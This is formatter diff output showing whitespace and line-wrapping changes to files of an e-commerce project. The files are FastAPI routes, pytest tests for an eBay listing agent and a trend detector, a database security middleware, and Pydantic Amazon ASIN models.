-    router.include_router(marketplace_router, prefix="/marketplace", tags=["marketplace"])
+
+    router.include_router(
+        marketplace_router, prefix="/marketplace", tags=["marketplace"]
+    )
 except ImportError:
     pass
 
 try:
     from .monitoring import router as monitoring_router
+
     router.include_router(monitoring_router, prefix="/monitoring", tags=["monitoring"])
 except ImportError:
     pass
 
 try:
     from .shipping import router as shipping_router
+
     router.include_router(shipping_router, prefix="/shipping", tags=["shipping"])
 except ImportError:
     pass
 
 try:
     from .users import router as users_router
+
     router.include_router(users_router, prefix="/users", tags=["users"])
 except ImportError:
     pass
 
 __all__ = ["router"]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/test_listing_agent.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/test_listing_agent.py	2025-06-19 04:03:42.649593+00:00
@@ -24,11 +24,11 @@
         "ebay_cert_id": "test_cert_id",
         "ebay_token": "test_token",
         "ai_service_url": "http://test-ai-service",
         "paypal_email": "test@example.com",
         "default_policies": {},
-        "image_validation_enabled": True
+        "image_validation_enabled": True,
     }
 
 
 @pytest.fixture
 def mock_config_manager():
@@ -50,18 +50,20 @@
     optimizer = MagicMock(spec=BatteryOptimizer)
     return optimizer
 
 
 @pytest.fixture
-def listing_agent(mock_config, mock_config_manager, mock_alert_manager, mock_battery_optimizer):
+def listing_agent(
+    mock_config, mock_config_manager, mock_alert_manager, mock_battery_optimizer
+):
     """Create ListingAgent instance for testing."""
     return ListingAgent(
         marketplace="ebay",
         config_manager=mock_config_manager,
         alert_manager=mock_alert_manager,
         battery_optimizer=mock_battery_optimizer,
-        config=mock_config
+        config=mock_config,
     )
 
 
 @pytest.fixture
 def sample_product_data():
@@ -69,27 +71,24 @@
     return {
         "title": "Test Product",
         "description": "Test product description",
         "price": 25.99,
         "sku": "TEST-SKU-001",
-        "images": [
-            "https://example.com/image1.jpg",
-            "https://example.com/image2.jpg"
-        ],
+        "images": ["https://example.com/image1.jpg", "https://example.com/image2.jpg"],
         "condition": "new",
-        "category": "electronics"
+        "category": "electronics",
     }
 
 
 @pytest.fixture
 def sample_market_data():
     """Sample market data for testing."""
     return {
         "average_price": 24.50,
         "competition_level": "medium",
         "trending_keywords": ["test", "product", "electronics"],
-        "seasonal_factor": 1.1
+        "seasonal_factor": 1.1,
     }
 
 
 @pytest.fixture
 def sample_listing_data():
@@ -105,11 +104,11 @@
         "condition_id": "1000",
         "listing_duration": "GTC",
         "quantity": 1,
         "payment_policy_id": "payment_123",
         "return_policy_id": "return_123",
-        "shipping_policy_id": "shipping_123"
+        "shipping_policy_id": "shipping_123",
     }
 
 
 class TestListingAgent:
     """Test cases for ListingAgent."""
@@ -126,258 +125,351 @@
     @pytest.mark.asyncio
     async def test_required_config_fields(self, listing_agent):
         """Test required configuration fields."""
         required_fields = listing_agent._get_required_config_fields()
         expected_fields = [
-            "api_key", "marketplace_id", "rate_limit", "timeout",
-            "ebay_app_id", "ebay_dev_id", "ebay_cert_id", "ebay_token",
-            "ai_service_url", "paypal_email", "default_policies",
-            "image_validation_enabled"
+            "api_key",
+            "marketplace_id",
+            "rate_limit",
+            "timeout",
+            "ebay_app_id",
+            "ebay_dev_id",
+            "ebay_cert_id",
+            "ebay_token",
+            "ai_service_url",
+            "paypal_email",
+            "default_policies",
+            "image_validation_enabled",
         ]
-        
+
         for field in expected_fields:
             assert field in required_fields
 
     @pytest.mark.asyncio
-    async def test_create_optimized_listing_success(self, listing_agent, sample_product_data, 
-                                                   sample_market_data):
+    async def test_create_optimized_listing_success(
+        self, listing_agent, sample_product_data, sample_market_data
+    ):
         """Test successful optimized listing creation."""
-        with patch.object(listing_agent, '_optimize_title') as mock_title:
-            with patch.object(listing_agent, '_generate_description') as mock_desc:
-                with patch.object(listing_agent, '_generate_item_specifics') as mock_specs:
-                    with patch.object(listing_agent, '_get_category_id') as mock_category:
-                        with patch.object(listing_agent, '_optimize_pricing') as mock_pricing:
-                            with patch.object(listing_agent, '_process_images') as mock_images:
-                                with patch.object(listing_agent, '_determine_condition') as mock_condition:
-                                    with patch.object(listing_agent, '_get_payment_policy') as mock_payment:
-                                        with patch.object(listing_agent, '_get_return_policy') as mock_return:
-                                            with patch.object(listing_agent, '_get_shipping_policy') as mock_shipping:
-                                                with patch.object(listing_agent, '_validate_listing') as mock_validate:
+        with patch.object(listing_agent, "_optimize_title") as mock_title:
+            with patch.object(listing_agent, "_generate_description") as mock_desc:
+                with patch.object(
+                    listing_agent, "_generate_item_specifics"
+                ) as mock_specs:
+                    with patch.object(
+                        listing_agent, "_get_category_id"
+                    ) as mock_category:
+                        with patch.object(
+                            listing_agent, "_optimize_pricing"
+                        ) as mock_pricing:
+                            with patch.object(
+                                listing_agent, "_process_images"
+                            ) as mock_images:
+                                with patch.object(
+                                    listing_agent, "_determine_condition"
+                                ) as mock_condition:
+                                    with patch.object(
+                                        listing_agent, "_get_payment_policy"
+                                    ) as mock_payment:
+                                        with patch.object(
+                                            listing_agent, "_get_return_policy"
+                                        ) as mock_return:
+                                            with patch.object(
+                                                listing_agent, "_get_shipping_policy"
+                                            ) as mock_shipping:
+                                                with patch.object(
+                                                    listing_agent, "_validate_listing"
+                                                ) as mock_validate:
                                                     # Setup mocks
-                                                    mock_title.return_value = "Optimized Title"
-                                                    mock_desc.return_value = "Optimized Description"
-                                                    mock_specs.return_value = {"Brand": "TestBrand"}
+                                                    mock_title.return_value = (
+                                                        "Optimized Title"
+                                                    )
+                                                    mock_desc.return_value = (
+                                                        "Optimized Description"
+                                                    )
+                                                    mock_specs.return_value = {
+                                                        "Brand": "TestBrand"
+                                                    }
                                                     mock_category.return_value = "12345"
-                                                    mock_pricing.return_value = {"recommended_price": 26.99}
-                                                    mock_images.return_value = ["https://example.com/image1.jpg"]
+                                                    mock_pricing.return_value = {
+                                                        "recommended_price": 26.99
+                                                    }
+                                                    mock_images.return_value = [
+                                                        "https://example.com/image1.jpg"
+                                                    ]
                                                     mock_condition.return_value = "1000"
-                                                    mock_payment.return_value = "payment_123"
-                                                    mock_return.return_value = "return_123"
-                                                    mock_shipping.return_value = "shipping_123"
+                                                    mock_payment.return_value = (
+                                                        "payment_123"
+                                                    )
+                                                    mock_return.return_value = (
+                                                        "return_123"
+                                                    )
+                                                    mock_shipping.return_value = (
+                                                        "shipping_123"
+                                                    )
                                                     mock_validate.return_value = True
-                                                    
+
                                                     result = await listing_agent.create_optimized_listing(
-                                                        sample_product_data, sample_market_data
-                                                    )
-                                                    
+                                                        sample_product_data,
+                                                        sample_market_data,
+                                                    )
+
                                                     assert result is not None
-                                                    assert result["title"] == "Optimized Title"
+                                                    assert (
+                                                        result["title"]
+                                                        == "Optimized Title"
+                                                    )
                                                     assert result["price"] == 26.99
-                                                    assert result["category_id"] == "12345"
-
-    @pytest.mark.asyncio
-    async def test_create_optimized_listing_validation_failure(self, listing_agent, 
-                                                              sample_product_data, sample_market_data):
+                                                    assert (
+                                                        result["category_id"] == "12345"
+                                                    )
+
+    @pytest.mark.asyncio
+    async def test_create_optimized_listing_validation_failure(
+        self, listing_agent, sample_product_data, sample_market_data
+    ):
         """Test listing creation with validation failure."""
-        with patch.object(listing_agent, '_optimize_title') as mock_title:
-            with patch.object(listing_agent, '_generate_description') as mock_desc:
-                with patch.object(listing_agent, '_generate_item_specifics') as mock_specs:
-                    with patch.object(listing_agent, '_get_category_id') as mock_category:
-                        with patch.object(listing_agent, '_optimize_pricing') as mock_pricing:
-                            with patch.object(listing_agent, '_process_images') as mock_images:
-                                with patch.object(listing_agent, '_determine_condition') as mock_condition:
-                                    with patch.object(listing_agent, '_get_payment_policy') as mock_payment:
-                                        with patch.object(listing_agent, '_get_return_policy') as mock_return:
-                                            with patch.object(listing_agent, '_get_shipping_policy') as mock_shipping:
-                                                with patch.object(listing_agent, '_validate_listing') as mock_validate:
+        with patch.object(listing_agent, "_optimize_title") as mock_title:
+            with patch.object(listing_agent, "_generate_description") as mock_desc:
+                with patch.object(
+                    listing_agent, "_generate_item_specifics"
+                ) as mock_specs:
+                    with patch.object(
+                        listing_agent, "_get_category_id"
+                    ) as mock_category:
+                        with patch.object(
+                            listing_agent, "_optimize_pricing"
+                        ) as mock_pricing:
+                            with patch.object(
+                                listing_agent, "_process_images"
+                            ) as mock_images:
+                                with patch.object(
+                                    listing_agent, "_determine_condition"
+                                ) as mock_condition:
+                                    with patch.object(
+                                        listing_agent, "_get_payment_policy"
+                                    ) as mock_payment:
+                                        with patch.object(
+                                            listing_agent, "_get_return_policy"
+                                        ) as mock_return:
+                                            with patch.object(
+                                                listing_agent, "_get_shipping_policy"
+                                            ) as mock_shipping:
+                                                with patch.object(
+                                                    listing_agent, "_validate_listing"
+                                                ) as mock_validate:
                                                     # Setup mocks
                                                     mock_title.return_value = "Title"
-                                                    mock_desc.return_value = "Description"
+                                                    mock_desc.return_value = (
+                                                        "Description"
+                                                    )
                                                     mock_specs.return_value = {}
                                                     mock_category.return_value = "12345"
-                                                    mock_pricing.return_value = {"recommended_price": 26.99}
+                                                    mock_pricing.return_value = {
+                                                        "recommended_price": 26.99
+                                                    }
                                                     mock_images.return_value = []
                                                     mock_condition.return_value = "1000"
-                                                    mock_payment.return_value = "payment_123"
-                                                    mock_return.return_value = "return_123"
-                                                    mock_shipping.return_value = "shipping_123"
-                                                    mock_validate.return_value = False  # Validation fails
-                                                    
+                                                    mock_payment.return_value = (
+                                                        "payment_123"
+                                                    )
+                                                    mock_return.return_value = (
+                                                        "return_123"
+                                                    )
+                                                    mock_shipping.return_value = (
+                                                        "shipping_123"
+                                                    )
+                                                    mock_validate.return_value = (
+                                                        False  # Validation fails
+                                                    )
+
                                                     result = await listing_agent.create_optimized_listing(
-                                                        sample_product_data, sample_market_data
-                                                    )
-                                                    
+                                                        sample_product_data,
+                                                        sample_market_data,
+                                                    )
+
                                                     assert result is None
 
     @pytest.mark.asyncio
     async def test_publish_listing_success(self, listing_agent, sample_listing_data):
         """Test successful listing publication."""
-        with patch.object(listing_agent, '_execute_with_retry') as mock_retry:
+        with patch.object(listing_agent, "_execute_with_retry") as mock_retry:
             mock_retry.return_value = {
                 "Ack": "Success",
                 "ItemID": "item_123456789",
-                "Warnings": []
+                "Warnings": [],
             }
-            
+
             result = await listing_agent.publish_listing(sample_listing_data)
-            
+
             assert result["success"] is True
             assert result["listing_id"] == "item_123456789"
             assert result["warnings"] == []
 
     @pytest.mark.asyncio
-    async def test_publish_listing_with_warnings(self, listing_agent, sample_listing_data):
+    async def test_publish_listing_with_warnings(
+        self, listing_agent, sample_listing_data
+    ):
         """Test listing publication with warnings."""
-        with patch.object(listing_agent, '_execute_with_retry') as mock_retry:
+        with patch.object(listing_agent, "_execute_with_retry") as mock_retry:
             mock_retry.return_value = {
                 "Ack": "Warning",
                 "ItemID": "item_123456789",
-                "Warnings": ["Image quality could be improved"]
+                "Warnings": ["Image quality could be improved"],
             }
-            
+
             result = await listing_agent.publish_listing(sample_listing_data)
-            
+
             assert result["success"] is True
             assert result["listing_id"] == "item_123456789"
             assert len(result["warnings"]) == 1
 
     @pytest.mark.asyncio
     async def test_publish_listing_failure(self, listing_agent, sample_listing_data):
         """Test listing publication failure."""
-        with patch.object(listing_agent, '_execute_with_retry') as mock_retry:
+        with patch.object(listing_agent, "_execute_with_retry") as mock_retry:
             mock_retry.return_value = {
                 "Ack": "Failure",
-                "Errors": ["Invalid category ID"]
+                "Errors": ["Invalid category ID"],
             }
-            
+
             result = await listing_agent.publish_listing(sample_listing_data)
-            
+
             assert result["success"] is False
             assert "error" in result
 
     @pytest.mark.asyncio
     async def test_process_images_valid(self, listing_agent):
         """Test processing valid images."""
         images = [
             "https://example.com/image1.jpg",
             "https://example.com/image2.jpg",
-            "https://example.com/image3.jpg"
+            "https://example.com/image3.jpg",
         ]
-        
-        with patch.object(listing_agent, '_validate_image') as mock_validate:
+
+        with patch.object(listing_agent, "_validate_image") as mock_validate:
             mock_validate.return_value = True
-            
+
             result = await listing_agent._process_images(images)
-            
+
             assert len(result) == 3
             assert all(img in result for img in images)
 
     @pytest.mark.asyncio
     async def test_process_images_some_invalid(self, listing_agent):
         """Test processing images with some invalid ones."""
         images = [
             "https://example.com/image1.jpg",
             "invalid_url",
-            "https://example.com/image3.jpg"
+            "https://example.com/image3.jpg",
         ]
-        
-        with patch.object(listing_agent, '_validate_image') as mock_validate:
+
+        with patch.object(listing_agent, "_validate_image") as mock_validate:
+
             def validate_side_effect(url):
                 return url.startswith("https://")
+
             mock_validate.side_effect = validate_side_effect
-            
+
             result = await listing_agent._process_images(images)
-            
+
             assert len(result) == 2
             assert "https://example.com/image1.jpg" in result
             assert "https://example.com/image3.jpg" in result
             assert "invalid_url" not in result
 
     @pytest.mark.asyncio
     async def test_process_images_limit(self, listing_agent):
         """Test image processing respects eBay's 12 image limit."""
         images = [f"https://example.com/image{i}.jpg" for i in range(15)]
-        
-        with patch.object(listing_agent, '_validate_image') as mock_validate:
+
+        with patch.object(listing_agent, "_validate_image") as mock_validate:
             mock_validate.return_value = True
-            
+
             result = await listing_agent._process_images(images)
-            
+
             assert len(result) == 12  # eBay limit
 
     @pytest.mark.asyncio
     async def test_validate_listing_success(self, listing_agent, sample_listing_data):
         """Test successful listing validation."""
         result = await listing_agent._validate_listing(sample_listing_data)
         assert result is True
 
     @pytest.mark.asyncio
-    async def test_validate_listing_missing_field(self, listing_agent, sample_listing_data):
+    async def test_validate_listing_missing_field(
+        self, listing_agent, sample_listing_data
+    ):
         """Test listing validation with missing required field."""
         del sample_listing_data["title"]
-        
+
         result = await listing_agent._validate_listing(sample_listing_data)
         assert result is False
 
     @pytest.mark.asyncio
-    async def test_validate_listing_title_too_long(self, listing_agent, sample_listing_data):
+    async def test_validate_listing_title_too_long(
+        self, listing_agent, sample_listing_data
+    ):
         """Test listing validation with title too long."""
         sample_listing_data["title"] = "x" * 100  # Exceeds 80 character limit
-        
+
         result = await listing_agent._validate_listing(sample_listing_data)
         assert result is False
 
     @pytest.mark.asyncio
     async def test_validate_listing_no_images(self, listing_agent, sample_listing_data):
         """Test listing validation with no images."""
         sample_listing_data["images"] = []
-        
+
         result = await listing_agent._validate_listing(sample_listing_data)
         assert result is False
 
     @pytest.mark.asyncio
     async def test_execute_with_retry_success(self, listing_agent):
         """Test retry mechanism with successful operation."""
         operation = MagicMock(return_value="success")
-        
+
         result = await listing_agent._execute_with_retry(operation)
-        
+
         assert result == "success"
         assert operation.call_count == 1
 
     @pytest.mark.asyncio
     async def test_execute_with_retry_eventual_success(self, listing_agent):
         """Test retry mechanism with eventual success."""
-        operation = MagicMock(side_effect=[Exception("fail"), Exception("fail"), "success"])
-        
-        with patch('asyncio.sleep'):  # Mock sleep to speed up test
+        operation = MagicMock(
+            side_effect=[Exception("fail"), Exception("fail"), "success"]
+        )
+
+        with patch("asyncio.sleep"):  # Mock sleep to speed up test
             result = await listing_agent._execute_with_retry(operation)
-        
+
         assert result == "success"
         assert operation.call_count == 3
 
     @pytest.mark.asyncio
     async def test_execute_with_retry_max_retries(self, listing_agent):
         """Test retry mechanism reaching max retries."""
         operation = MagicMock(side_effect=Exception("persistent failure"))
-        
-        with patch('asyncio.sleep'):  # Mock sleep to speed up test
+
+        with patch("asyncio.sleep"):  # Mock sleep to speed up test
             with pytest.raises(Exception, match="persistent failure"):
                 await listing_agent._execute_with_retry(operation)
-        
+
         assert operation.call_count == 3  # max_retries
 
     @pytest.mark.asyncio
     async def test_prepare_listing_payload(self, listing_agent, sample_listing_data):
         """Test eBay API payload preparation."""
         payload = listing_agent._prepare_listing_payload(sample_listing_data)
-        
+
         assert "Item" in payload
         item = payload["Item"]
         assert item["Title"] == sample_listing_data["title"]
         assert item["StartPrice"] == str(sample_listing_data["price"])
-        assert item["PrimaryCategory"]["CategoryID"] == sample_listing_data["category_id"]
+        assert (
+            item["PrimaryCategory"]["CategoryID"] == sample_listing_data["category_id"]
+        )
         assert item["ListingType"] == "FixedPriceItem"
 
     @pytest.mark.asyncio
     async def test_validate_image_valid_url(self, listing_agent):
         """Test image validation with valid URL."""
@@ -387,42 +479,54 @@
     @pytest.mark.asyncio
     async def test_validate_image_invalid_url(self, listing_agent):
         """Test image validation with invalid URL."""
         result = await listing_agent._validate_image("not_a_url")
         assert result is False
-        
+
         result = await listing_agent._validate_image("")
         assert result is False
 
     @pytest.mark.asyncio
-    async def test_mock_methods(self, listing_agent, sample_product_data, sample_market_data):
+    async def test_mock_methods(
+        self, listing_agent, sample_product_data, sample_market_data
+    ):
         """Test mock implementation methods."""
         # Test title optimization
-        title = await listing_agent._optimize_title(sample_product_data, sample_market_data)
+        title = await listing_agent._optimize_title(
+            sample_product_data, sample_market_data
+        )
         assert "Optimized" in title
-        
+
         # Test description generation
-        description = await listing_agent._generate_description(sample_product_data, sample_market_data)
+        description = await listing_agent._generate_description(
+            sample_product_data, sample_market_data
+        )
         assert "Optimized description" in description
-        
+
         # Test item specifics generation
-        specifics = await listing_agent._generate_item_specifics(sample_product_data, sample_market_data)
+        specifics = await listing_agent._generate_item_specifics(
+            sample_product_data, sample_market_data
+        )
         assert isinstance(specifics, dict)
         assert "Brand" in specifics
-        
+
         # Test category ID determination
         category_id = await listing_agent._get_category_id(sample_product_data)
         assert category_id == "12345"
-        
+
         # Test pricing optimization
-        pricing = await listing_agent._optimize_pricing(sample_product_data, sample_market_data)
+        pricing = await listing_agent._optimize_pricing(
+            sample_product_data, sample_market_data
+        )
         assert "recommended_price" in pricing
         assert pricing["recommended_price"] > sample_product_data["price"]
 
     @pytest.mark.asyncio
     async def test_get_shipping_details(self, listing_agent):
         """Test shipping details configuration."""
         shipping_details = listing_agent._get_shipping_details()
-        
+
         assert shipping_details["ShippingType"] == "Flat"
         assert "ShippingServiceOptions" in shipping_details
-        assert shipping_details["ShippingServiceOptions"]["ShippingService"] == "USPSMedia"
+        assert (
+            shipping_details["ShippingServiceOptions"]["ShippingService"] == "USPSMedia"
+        )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/test_listing_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/middleware/database_middleware.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/middleware/database_middleware.py	2025-06-19 04:03:42.665814+00:00
@@ -14,67 +14,68 @@
 from fastapi import Depends, FastAPI, Request, Response
 from fastapi.middleware.base import BaseHTTPMiddleware
 from sqlalchemy import text
 from sqlalchemy.ext.asyncio import AsyncSession
 
-from fs_agt_clean.core.security.access_control import UserSession, get_current_user_session
+from fs_agt_clean.core.security.access_control import (
+    UserSession,
+    get_current_user_session,
+)
 from fs_agt_clean.core.utils.logging import get_logger
 from fs_agt_clean.database.connection_manager import db_manager
 
 logger = get_logger(__name__)
 
 
 class DatabaseSecurityMiddleware(BaseHTTPMiddleware):
     """
     FastAPI middleware for database security.
-    
+
     This middleware sets the current user context for row-level security,
     collects client information for audit logging, and manages database
     connection security.
     """
-    
+
     def __init__(
         self,
         app: FastAPI,
         get_user_session: Callable = get_current_user_session,
     ):
         """
         Initialize the middleware.
-        
+
         Args:
             app: FastAPI application
             get_user_session: Function to get the current user session
         """
         super().__init__(app)
         self.get_user_session = get_user_session
         logger.info("Database security middleware initialized")
-    
-    async def dispatch(
-        self, request: Request, call_next: Callable
-    ) -> Response:
+
+    async def dispatch(self, request: Request, call_next: Callable) -> Response:
         """
         Process the request and set up database security context.
-        
+
         Args:
             request: The request
             call_next: The next middleware or route handler
-            
+
         Returns:
             The response
         """
         # Get client information
         client_ip = request.client.host if request.client else "unknown"
         user_agent = request.headers.get("user-agent", "unknown")
         session_id = request.cookies.get("session_id", "unknown")
-        
+
         # Get user session
         user_session = None
         try:
             user_session = await self.get_user_session(request)
         except Exception as e:
             logger.warning("Error getting user session: %s", e)
-        
+
         # Set up database security context
         async with db_manager.session() as session:
             try:
                 # Set current user ID
                 if user_session and user_session.user_id:
@@ -84,11 +85,11 @@
                     )
                 else:
                     await session.execute(
                         text("SET LOCAL app.current_user_id = 'anonymous'")
                     )
-                
+
                 # Set client information
                 await session.execute(
                     text("SET LOCAL app.client_ip = :client_ip"),
                     {"client_ip": client_ip},
                 )
@@ -98,50 +99,53 @@
                 )
                 await session.execute(
                     text("SET LOCAL app.session_id = :session_id"),
                     {"session_id": session_id},
                 )
-                
+
                 # Commit the transaction to apply settings
                 await session.commit()
             except Exception as e:
                 logger.error("Error setting database security context: %s", e)
                 await session.rollback()
-        
+
         # Process the request
         start_time = time.time()
         response = await call_next(request)
         process_time = time.time() - start_time
-        
+
         # Log request for sensitive operations
         path = request.url.path
         method = request.method
-        if any(sensitive in path for sensitive in ["/users", "/orders", "/payments", "/auth"]):
+        if any(
+            sensitive in path
+            for sensitive in ["/users", "/orders", "/payments", "/auth"]
+        ):
             logger.info(
                 "Sensitive operation: %s %s (%.3f sec) - User: %s, IP: %s",
                 method,
                 path,
                 process_time,
                 user_session.user_id if user_session else "anonymous",
                 client_ip,
             )
-        
+
         return response
 
 
 # Dependency for getting a secure database session with user context
 async def get_secure_db_session(
     request: Request,
     user_session: UserSession = Depends(get_current_user_session),
 ) -> AsyncSession:
     """
     Get a secure database session with user context.
-    
+
     Args:
         request: The request
         user_session: The user session
-        
+
     Returns:
         A database session with security context
     """
     async with db_manager.session() as session:
         try:
@@ -153,16 +157,16 @@
                 )
             else:
                 await session.execute(
                     text("SET LOCAL app.current_user_id = 'anonymous'")
                 )
-            
+
             # Set client information
             client_ip = request.client.host if request.client else "unknown"
             user_agent = request.headers.get("user-agent", "unknown")
             session_id = request.cookies.get("session_id", "unknown")
-            
+
             await session.execute(
                 text("SET LOCAL app.client_ip = :client_ip"),
                 {"client_ip": client_ip},
             )
             await session.execute(
@@ -171,9 +175,9 @@
             )
             await session.execute(
                 text("SET LOCAL app.session_id = :session_id"),
                 {"session_id": session_id},
             )
-            
+
             yield session
         finally:
             await session.close()
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/middleware/database_middleware.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/models/asin_data.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/models/asin_data.py	2025-06-19 04:03:42.800317+00:00
@@ -1,15 +1,16 @@
 """
 ASIN data models for Amazon product information.
 """
+
 from typing import List, Optional
 from pydantic import BaseModel, Field, ConfigDict
 
 
 class ASINData(BaseModel):
     """Amazon Standard Identification Number (ASIN) data model."""
-    
+
     asin: str = Field(..., description="Amazon Standard Identification Number")
     title: str = Field(..., description="Product title")
     brand: Optional[str] = Field(None, description="Product brand")
     description: Optional[str] = Field(None, description="Product description")
     price: Optional[float] = Field(None, description="Product price")
@@ -18,58 +19,59 @@
     features: Optional[List[str]] = Field(None, description="Product features")
     categories: Optional[List[str]] = Field(None, description="Product categories")
     rating: Optional[float] = Field(None, description="Product rating")
     review_count: Optional[int] = Field(None, description="Number of reviews")
     availability: Optional[str] = Field(None, description="Product availability status")
-    
+
     class Config:
         """Pydantic model configuration."""
-        
+
         json_schema_extra = {
             "example": {
                 "asin": "B07PXGQC1Q",
                 "title": "Echo Dot (3rd Gen) - Smart speaker with Alexa",
                 "brand": "Amazon",
                 "description": "Use your voice to play music, answer questions, read the news, check the weather, set alarms, control compatible smart home devices, and more.",
                 "price": 39.99,
                 "currency": "USD",
-                "images": ["https://images-na.ssl-images-amazon.com/images/I/61MZfO8hGgL._SL1000_.jpg"],
-                "features": ["Voice control your music", "Control your smart home", "Make calls and send messages"],
+                "images": [
+                    "https://images-na.ssl-images-amazon.com/images/I/61MZfO8hGgL._SL1000_.jpg"
+                ],
+                "features": [
+                    "Voice control your music",
+                    "Control your smart home",
+                    "Make calls and send messages",
+                ],
                 "categories": ["Electronics", "Smart Home", "Speakers"],
                 "rating": 4.7,
                 "review_count": 193651,
-                "availability": "In Stock"
+                "availability": "In Stock",
             }
         }
 
 
 class ASINSearchRequest(BaseModel):
     """Request model for ASIN search."""
-    
+
     query: str = Field(..., description="Search query")
     marketplace: Optional[str] = Field("US", description="Amazon marketplace")
-    
+
     class Config:
         """Pydantic model configuration."""
-        
-        json_schema_extra = {
-            "example": {
-                "query": "echo dot",
-                "marketplace": "US"
-            }
-        }
+
+        json_schema_extra = {"example": {"query": "echo dot", "marketplace": "US"}}
 
 
 class ASINSearchResponse(BaseModel):
     """Response model for ASIN search."""
-    
+
     results: List[ASINData] = Field(..., description="Search results")
     total: int = Field(..., description="Total number of results")
-    
+
     class Config:
         """Pydantic model configuration."""
-        
+
         json_schema_extra = {
             "example": {
                 "results": [
                     {
                         "asin": "B07PXGQC1Q",
@@ -77,11 +79,11 @@
                         "brand": "Amazon",
                         "price": 39.99,
                         "currency": "USD",
                         "rating": 4.7,
                         "review_count": 193651,
-                        "availability": "In Stock"
+                        "availability": "In Stock",
                     }
                 ],
-                "total": 1
+                "total": 1,
             }
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/models/asin_data.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/test_trend_detector.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/test_trend_detector.py	2025-06-19 04:03:42.882221+00:00
@@ -3,15 +3,23 @@
 import pytest
 from datetime import datetime, timedelta, timezone
 from unittest.mock import AsyncMock, MagicMock, patch
 from uuid import uuid4
 
-from fs_agt_clean.agents.market.specialized.trend_detector import TrendDetector, TrendAnalysisData
+from fs_agt_clean.agents.market.specialized.trend_detector import (
+    TrendDetector,
+    TrendAnalysisData,
+)
 from fs_agt_clean.core.config.config_manager import ConfigManager
 from fs_agt_clean.core.events.constants import EventType
 from fs_agt_clean.core.monitoring.alerts.manager import AlertManager
-from fs_agt_clean.core.monitoring.alerts.models import Alert, AlertSeverity, AlertStatus, AlertType
+from fs_agt_clean.core.monitoring.alerts.models import (
+    Alert,
+    AlertSeverity,
+    AlertStatus,
+    AlertType,
+)
 from fs_agt_clean.core.monitoring.metric_types import MetricType
 from fs_agt_clean.mobile.battery_optimizer import BatteryOptimizer
 
 
 @pytest.fixture
@@ -24,11 +32,11 @@
         "timeout": 30,
         "trend_threshold": 0.6,
         "analysis_interval": 3600,
         "confidence_threshold": 0.7,
         "data_window_size": 24,
-        "seasonal_adjustment": True
+        "seasonal_adjustment": True,
     }
 
 
 @pytest.fixture
 def mock_config_manager():
@@ -50,29 +58,31 @@
     optimizer = MagicMock(spec=BatteryOptimizer)
     return optimizer
 
 
 @pytest.fixture
-def trend_detector(mock_config, mock_config_manager, mock_alert_manager, mock_battery_optimizer):
+def trend_detector(
+    mock_config, mock_config_manager, mock_alert_manager, mock_battery_optimizer
+):
     """Create TrendDetector instance for testing."""
     return TrendDetector(
         marketplace="ebay",
         config_manager=mock_config_manager,
         alert_manager=mock_alert_manager,
         battery_optimizer=mock_battery_optimizer,
-        config=mock_config
+        config=mock_config,
     )
 
 
 @pytest.fixture
 def sample_market_data():
     """Sample market data for testing."""
     return {
         "price_history": [10.0, 10.5, 11.0, 11.5, 12.0],
         "volume_history": [100, 110, 120, 130, 140],
         "category": "electronics",
-        "timestamp": datetime.now(timezone.utc)
+        "timestamp": datetime.now(timezone.utc),
     }
 
 
 @pytest.fixture
 def sample_trend_data():
@@ -80,11 +90,11 @@
     return TrendAnalysisData(
         trend_type="upward_trend",
         start_time=datetime.now(timezone.utc) - timedelta(hours=24),
         end_time=datetime.now(timezone.utc),
         confidence=0.8,
-        metadata={"price_change": 0.2, "volume_change": 0.4}
+        metadata={"price_change": 0.2, "volume_change": 0.4},
     )
 
 
 class TestTrendDetector:
     """Test cases for TrendDetector."""
@@ -99,53 +109,63 @@
     @pytest.mark.asyncio
     async def test_required_config_fields(self, trend_detector):
         """Test required configuration fields."""
         required_fields = trend_detector._get_required_config_fields()
         expected_fields = [
-            "api_key", "marketplace_id", "rate_limit", "timeout",
-            "trend_threshold", "analysis_interval", "confidence_threshold",
-            "data_window_size", "seasonal_adjustment"
+            "api_key",
+            "marketplace_id",
+            "rate_limit",
+            "timeout",
+            "trend_threshold",
+            "analysis_interval",
+            "confidence_threshold",
+            "data_window_size",
+            "seasonal_adjustment",
         ]
-        
+
         for field in expected_fields:
             assert field in required_fields
 
     @pytest.mark.asyncio
     async def test_analyze_trend_success(self, trend_detector, sample_market_data):
         """Test successful trend analysis."""
         result = await trend_detector.analyze_trend(sample_market_data)
-        
+
         assert result is not None
         assert isinstance(result, TrendAnalysisData)
         assert result.trend_type in [
-            "bullish_momentum", "bearish_momentum", "sideways_consolidation",
-            "upward_trend", "downward_trend", "neutral"
+            "bullish_momentum",
+            "bearish_momentum",
+            "sideways_consolidation",
+            "upward_trend",
+            "downward_trend",
+            "neutral",
         ]
         assert 0 <= result.confidence <= 1
 
     @pytest.mark.asyncio
     async def test_analyze_trend_insufficient_data(self, trend_detector):
         """Test trend analysis with insufficient data."""
         market_data = {"price_history": [10.0], "volume_history": []}
-        
+
         result = await trend_detector.analyze_trend(market_data)
-        
+
         assert result is None
 
     @pytest.mark.asyncio
     async def test_analyze_trend_below_threshold(self, trend_detector):
         """Test trend analysis below confidence threshold."""
         # Set high threshold
         trend_detector.config["trend_threshold"] = 0.9
-        
+
         market_data = {
             "price_history": [10.0, 10.01, 10.02],  # Very small changes
-            "volume_history": [100, 101, 102]
+            "volume_history": [100, 101, 102],
         }
-        
+
         result = await trend_detector.analyze_trend(market_data)
-        
+
         # Should return None due to low confidence
         assert result is None
 
     @pytest.mark.asyncio
     async def test_detect_trend_types(self, trend_detector):
@@ -153,17 +173,17 @@
         # Test bullish momentum
